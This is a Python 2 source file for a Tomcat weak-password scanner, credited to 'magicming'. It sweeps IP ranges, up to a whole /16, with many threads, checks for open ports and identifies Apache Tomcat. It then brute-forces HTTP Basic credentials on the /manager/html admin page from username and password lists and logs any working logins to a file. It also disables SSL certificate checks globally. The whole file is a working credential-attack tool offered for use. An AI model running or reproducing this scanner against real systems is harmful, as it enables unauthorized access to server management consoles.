#!/usr/bin/env python
#coding:utf-8

"""
@software: 醉考拉_tomcat弱口令扫描器 v1.0
@author: magicming
@site: https://github.com/magicming200
@time: 2017/1/11 22:48
"""

import sys
import os
import socket
import struct
import getopt
import Queue
import threading
import time
import urllib2
import ssl
import base64


gQueue=Queue.Queue()
gLock=threading.Lock()
#
gIpList=[]
gPortList=[]
gThreadAmount=100
gTimeout=10
gUserList=[]
gPassList=['']
#
gSCAN='scan-port'
gCHECK='check-app'
gCRACKSTART='crack-pass-start'
gCRACKOK='crack-pass-ok'

try:
    _create_unverified_https_context = ssl._create_unverified_context
except AttributeError:
    pass
else:
    ssl._create_default_https_context = _create_unverified_https_context


def exit():
    sys.exit(0)

def ipToNum(ip):
    packedIP = socket.inet_aton(ip)
    return struct.unpack("!L", packedIP)[0]

def numToIp(num):
    return socket.inet_ntoa(struct.pack('!L', num))

def getIpList(ip):
    global gIpList
    errMsg='-h:ip format is wrong'
    gIpList=[]
    if '.txt' in ip:#ip文件 ip.txt
        try:
            ipFile=open(ip,'r')
            for ipf in ipFile:
                gIpList.append(ipf.strip())
            ipFile.close()
        except Exception,e:
            print e
    elif '-' in ip:#ip段 192.168.1.1-192.168.10.200
        ipRange = ip.split('-')
        ipStart = long(ipToNum(ipRange[0]))
        ipEnd = long(ipToNum(ipRange[1]))
        ipCount = ipEnd - ipStart
        if ipCount >= 0 and ipCount <= 65536:
            for ipNum in range(ipStart,ipEnd+1):
                gIpList.append(numToIp(ipNum))
        else:
            print errMsg
            exit()
    else:#ip 192.168  192.168.1  192.168.1.1
        ipSplit=ip.split('.')
        section=len(ipSplit)
        if section==2:
            for c in range(1,255):
                for d in range(1,255):
                    ip='%s.%s.%d.%d'%(ipSplit[0],ipSplit[1],c,d)
                    gIpList.append(ip)
        elif section==3:
            for d in range(1,255):
                ip='%s.%s.%s.%d'%(ipSplit[0],ipSplit[1],ipSplit[2],d)
                gIpList.append(ip)
        elif section==4:
            gIpList.append(ip)
        else:
            print errMsg
            exit()
    return gIpList

def putInQueue(taskType,ipList,portList):
    global gQueue
    for ip in ipList:
        for port in portList:
            target=':'.join([taskType,ip,port])
            gQueue.put(target)

class TaskThread(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
    def run(self):
        global gQueue
        global gSCAN
        global gCHECK
        global gCRACKSTART
        while True:
            try:
                if not gQueue.empty():
                    task=gQueue.get()
                else:
                    break
            except:
                break
            try:
                taskType,taskHost,taskPort=task.split(':')

                if taskType==gSCAN:#扫描开放端口
                    portFlag = scanPort(taskType,taskHost,taskPort)
                    if portFlag==True:
                        gQueue.put(":".join([gCHECK,taskHost,taskPort]))

                elif taskType==gCHECK:#识别应用是否为tomcat
                    checkFlag = checkApp(taskType,taskHost,taskPort)
                    if checkFlag==True:
                        gQueue.put(':'.join([gCRACKSTART,taskHost,taskPort]))

                elif taskType==gCRACKSTART:#破解密码
                    outputLog(gCRACKSTART,taskHost,taskPort)
                    crackPassword(taskHost,taskPort)
            except:
               continue

def scanPort(taskType,host,port):#扫描开放端口
    global gTimeout
    try:
        socket.setdefaulttimeout(gTimeout/2)
        mysock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        mysock.connect((str(host),int(port)))
        outputLog(taskType,host,port)
        mysock.close()
        return True
    except:
        return False

def checkApp(scanType,host,port):#识别应用类型
    global gTimeout
    mark_info=['tomcat','is_test','Apache Tomcat']
    try:
        re_html = urllib2.urlopen("http://%s:%d/%s"%(host,int(port),mark_info[1]),timeout=gTimeout).read()
    except urllib2.HTTPError,e:
        re_html = e.read()
    except Exception,e:
        return False
    if mark_info[2].lower() in re_html.lower():
        outputLog(scanType,host,port,mark_info[0])
        return True
    else:
        return False

def crackPassword(host,port):
    global gTimeout
    global gCRACKOK
    global gUserList
    global gPassList
    url = "http://%s:%d"%(host,int(port))
    error_i=0
    flag_list=['Application Manager','Welcome']
    user_list=gUserList
    pass_list=gPassList
    for user in user_list:
        for password in pass_list:
            #output('test',user+'-'+password,0)
            try:
                login_url = url+'/manager/html'
                request = urllib2.Request(login_url)
                auth_str_temp=user+':'+password
                auth_str=base64.b64encode(auth_str_temp)
                request.add_header('Authorization', 'Basic '+auth_str)
                res = urllib2.urlopen(request,timeout=gTimeout)
                res_code = res.code
                res_html = res.read()
            except urllib2.HTTPError,e:
                res_code = e.code
                res_html = e.read()
            except urllib2.URLError,e:
                error_i+=1
                if error_i >= 3:
                    return 'NO'
                continue
            if int(res_code) == 404:
                return 'NO'
            if int(res_code) == 401 or int(res_code) == 403:
                continue
            for flag in flag_list:
                if flag in res_html:
                    info = '%s password is %s:%s'%(login_url,user,password)
                    outputLog(gCRACKOK,host,port,info)
                    info = 'YES|'+info
                    return info
    return 'NO'

def outputLog(scanType,host,port,msg=''):
    global gLock
    global gSCAN
    global gCHECK
    global gCRACKSTART
    global gCRACKOK
    gLock.acquire()
    timeStr=time.strftime('%X',time.localtime(time.time()))
    if scanType==gSCAN:
        print u'[%s]: %s:%d open'%(timeStr,host,int(port))
    elif scanType==gCHECK:
        print '[%s]: http://%s:%d is %s'%(timeStr,host,int(port),msg)
    elif scanType==gCRACKSTART:
        print '[%s]: start crack http://%s:%d'%(timeStr,host,int(port))
    elif scanType==gCRACKOK:
        if msg:
            print '[%s]: %s'%(timeStr,msg)
            file=open('result.txt','a')
            file.write('[%s]: %s\r\n'%(timeStr,msg))
            file.close()
    elif scanType=='test':#调试使用
        print 'test:%s:%d'%(host,port)
    gLock.release()

def threadJoin(m_count):
    global gQueue
    tmp_count = 0
    i = 0
    while True:
        time.sleep(1)
        ac_count = threading.activeCount()
        if ac_count < m_count and ac_count == tmp_count:#防止最后出现僵尸线程,做完事不释放.用变量i控制
            i+=1
        else:
            i = 0
        tmp_count = ac_count
        if (gQueue.empty() and threading.activeCount() <= 1) or i>8:
            print '----scan over!----  software:koala_tomcat_cmd.py  author:magicming'
            break

def getPortList(port):
    global gPortList
    gPortList=[]
    filename='port.txt'
    if len(port)==0 or '.txt' in port:
        if '.txt' in port:filename=port
        try:
            file = open(filename,'r')
            for p in file:
                gPortList.append(p.strip())
            file.close()
        except Exception,e:
            print e
    else:
        gPortList=port.split(',')
    return gPortList

def getUserAndPass():
    global gUserList
    global gPassList
    gUserList=[]
    ufile=open('username.txt','r')
    for user in ufile:
        gUserList.append(user.strip())
    ufile.close()
    gPassList=['']
    pfile=open('password.txt','r')
    for p in pfile:
        gPassList.append(p.strip())
    pfile.close()

def main():
    global gIpList
    global gPort
    global gThreadAmount
    global gTimeout
    global gSCAN
    errorMsg='An error has occurred. Usage: python '+os.path.basename(__file__)+' -h 192.168.1.1 [-p 7001,8080] [-m 50] [-t 10]'
    if(len(sys.argv)<2):
        print errorMsg
        exit()
    try:
        ip=''
        port=''
        options,args = getopt.getopt(sys.argv[1:],'h:p:m:t:')
        for opt,arg in options:
            if opt=='-h':
                ip=arg
            elif opt=='-p':
                port=arg
            elif opt=='-m':
                gThreadAmount=int(arg)
            elif opt=='-t':
                gTimeout=int(arg)
        if len(ip)>0:
            ipList = getIpList(ip)#获取ip列表
        else:
            print '-h is null. Please input ip.'
        if len(ipList)>0:
            portList=getPortList(port)#获取端口列表
            getUserAndPass()#获取用户名密码列表
            putInQueue(gSCAN,ipList,portList)#ip及端口保存进队列
            for t in range(gThreadAmount):
                t=TaskThread()
                t.setDaemon(True)
                t.start()
            threadJoin(gThreadAmount)
        else:
            print 'IP list is null. Please input ip.'
    except Exception,e:
        print errorMsg
        print 'Detailed Errors:'+e.message

if __name__=='__main__':
    main()
